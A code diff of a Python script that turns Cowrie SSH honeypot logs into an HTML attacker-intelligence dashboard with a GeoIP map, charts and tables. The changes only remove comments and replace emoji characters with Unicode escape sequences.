     table {{ font-size: 0.85em; }}
     table td, table th {{ padding: 8px 6px; }}
@@ -1502,10 +1469,8 @@ def generate_html(data):
     #map {{ height: 280px; }}
     canvas {{ max-height: 200px; }}
 
-    /* Fix Leaflet touch zoom marker drift */
     .leaflet-marker-icon {{ transition: none !important; }}
 
-    /* Prevent mobile zoom-out beyond viewport */
     html, body {{ touch-action: pan-x pan-y; max-width: 100vw; }}
     .container {{ max-width: 100vw; padding: 6px; overflow-x: hidden; }}
     .grid {{ gap: 10px; margin-bottom: 10px; }}
@@ -1518,7 +1483,7 @@ def generate_html(data):
 <div class="scanline"></div>
 
 <header>
-  <h1>🍯 HONEYPOT DASHBOARD</h1>
+  <h1>\U0001f36f HONEYPOT DASHBOARD</h1>
   <div class="subtitle">COWRIE SSH HONEYPOT // LIVE ATTACKER INTELLIGENCE // Generated: {data['generated']}</div>
 </header>
 
@@ -1535,14 +1500,14 @@ def generate_html(data):
 
   <div class="grid full">
     <div class="panel" style="overflow:visible;">
-      <h2>🌍 Attack Origins</h2>
+      <h2>\U0001f30d Attack Origins</h2>
       <div id="map"></div>
     </div>
   </div>
 
   <div class="grid">
     <div class="panel">
-      <h2>🏆 Top Attackers</h2>
+      <h2>\U0001f3c6 Top Attackers</h2>
       <div style="max-height:350px; overflow-y:auto;">
         <table>
           <tr><th>Attacker</th><th>Origin</th><th class="hide-mobile">ISP</th><th>Attempts</th></tr>
@@ -1551,7 +1516,7 @@ def generate_html(data):
       </div>
     </div>
     <div class="panel">
-      <h2>📡 Recent Activity</h2>
+      <h2>\U0001f4e1 Recent Activity</h2>
       <div class="activity-feed">
         {activity_rows}
       </div>
@@ -1560,7 +1525,7 @@ def generate_html(data):
 
   <div class="grid full">
     <div class="panel">
-      <h2>🎬 Greatest Hits</h2>
+      <h2>\U0001f3ac Greatest Hits</h2>
       <div class="greatest-hits">
         {greatest_hits_html}
       </div>
@@ -1569,18 +1534,18 @@ def generate_html(data):
 
   <div class="grid">
     <div class="panel">
-      <h2>🔑 Top Credentials</h2>
+      <h2>\U0001f511 Top Credentials</h2>
       <canvas id="credsChart"></canvas>
     </div>
     <div class="panel">
-      <h2>📈 Attack Timeline</h2>
+      <h2>\U0001f4c8 Attack Timeline</h2>
       <canvas id="timelineChart"></canvas>
     </div>
   </div>
 
   <div class="grid full">
     <div class="panel">
-      <h2>📊 Daily Breakdown</h2>
+      <h2>\U0001f4ca Daily Breakdown</h2>
       <div style="overflow-x:auto; max-height:500px; overflow-y:auto;">
         <table>
           <tr><th>Date</th><th>Sessions</th><th class="hide-mobile">Login Attempts</th><th>Successful</th><th>Unique IPs</th><th class="hide-mobile">Commands</th><th class="hide-mobile">Top Attacker</th></tr>
@@ -1592,7 +1557,7 @@ def generate_html(data):
 
   <div class="grid full">
     <div class="panel">
-      <h2>📊 All-Time Stats</h2>
+      <h2>\U0001f4ca All-Time Stats</h2>
       <div style="overflow-x:auto;">
         <table>
           <tr><th>Metric</th><th>Total</th><th>Avg / Day</th></tr>
@@ -1610,7 +1575,7 @@ def generate_html(data):
 
   <div class="grid full">
     <div class="panel">
-      <h2>💀 Successful Logins — What They Did</h2>
+      <h2>\U0001f480 Successful Logins \u2014 What They Did</h2>
       <div class="terminal" style="max-height:400px; overflow-y:auto;">
         {terminal_content}
       </div>
@@ -1639,7 +1604,6 @@ def generate_html(data):
     maxZoom: 18
   }}).addTo(map);
 
-  // Fix tile loading on mobile — recalculate container size after render
   setTimeout(function() {{ map.invalidateSize(true); }}, 100);
   setTimeout(function() {{ map.invalidateSize(true); }}, 300);
   setTimeout(function() {{ map.invalidateSize(true); }}, 1000);
@@ -1654,7 +1618,6 @@ def generate_html(data):
     var baseRadius = Math.max(6, Math.min(22, m.count * 2));
     var phase = Math.random() * Math.PI * 2;
 
-    // Outer ring (pulse effect)
     var ring = L.circleMarker([m.lat, m.lon], {{
       radius: baseRadius * 1.8,
       fillColor: '#ff4444',
@@ -1664,7 +1627,6 @@ def generate_html(data):
       opacity: 0.4
     }}).addTo(map);
 
-    // Inner dot
     var dot = L.circleMarker([m.lat, m.lon], {{
       radius: baseRadius,
       fillColor: '#ff4444',
@@ -1693,11 +1655,10 @@ def generate_html(data):
     markerLookup[m.ip] = dot;
   }});
 
-  // Animate pulse via JS — no CSS, so no drift
   function animatePulse() {{
     var t = Date.now() / 1000;
     pulseMarkers.forEach(function(pm) {{
-      var cycle = (Math.sin(t * 2 + pm.phase) + 1) / 2; // 0..1
+      var cycle = (Math.sin(t * 2 + pm.phase) + 1) / 2;
       pm.ring.setRadius(pm.baseRadius * (1.4 + cycle * 0.8));
       pm.ring.setStyle({{ opacity: 0.6 - cycle * 0.5, weight: 2 - cycle }});
       pm.dot.setStyle({{ fillOpacity: 0.5 + cycle * 0.3 }});
@@ -1793,9 +1754,8 @@ def generate_html(data):
 
 def main():
     print("[*] Parsing Cowrie log...")
-    # Read current + rotated logs
     rotated = sorted(f for f in glob.glob(LOG_PATH + "*") if f != LOG_PATH)
-    log_files = rotated + [LOG_PATH]  # rotated first, current last
+    log_files = rotated + [LOG_PATH]
     seen = set()
     events = []
     for lf in log_files:
@@ -1804,7 +1764,6 @@ def main():
             events.extend(parse_log(lf))
     print(f"[*] Loaded {len(events)} events from {len(log_files)} files")
 
-    # Cap to last 7 days
     cutoff = datetime.now(timezone.utc) - timedelta(days=7)
     before_filter = len(events)
     events = [e for e in events if datetime.fromisoformat(
@@ -1813,7 +1772,6 @@ def main():
     if len(events) < before_filter:
         print(f"[*] Filtered to last 7 days: {len(events)} events (dropped {before_filter - len(events)} old)")
 
-    # Deduplicate by (session, timestamp, eventid)
     seen_events = set()
     unique_events = []
     for e in events:
@@ -1828,7 +1786,6 @@ def main():
     if not events:
         print("[!] No events found. Generating empty dashboard.")
 
-    # Collect unique IPs
     all_ips = set()
     for e in events:
         ip = e.get("src_ip")
@@ -1836,20 +1793,17 @@ def main():
             all_ips.add(ip)
     print(f"[*] Found {len(all_ips)} unique IPs")
 
-    # GeoIP
     geo_cache = load_geo_cache()
     geo_cache = batch_geoip_lookup(all_ips, geo_cache)
 
-    # Analyze
     data = analyze_events(events, geo_cache)
 
-    # Generate HTML
     html = generate_html(data)
     tmp_path = OUTPUT_PATH + ".tmp"
     with open(tmp_path, "w") as f:
         f.write(html)
     os.rename(tmp_path, OUTPUT_PATH)
-    print(f"[✓] Dashboard written to {OUTPUT_PATH}")
+    print(f"[\u2713] Dashboard written to {OUTPUT_PATH}")
     print(f"    Sessions: {data['stats']['total_sessions']} | Logins: {data['stats']['total_login_attempts']} | "
           f"Success: {data['stats']['successful_logins']} | IPs: {data['stats']['unique_ips']}")
 
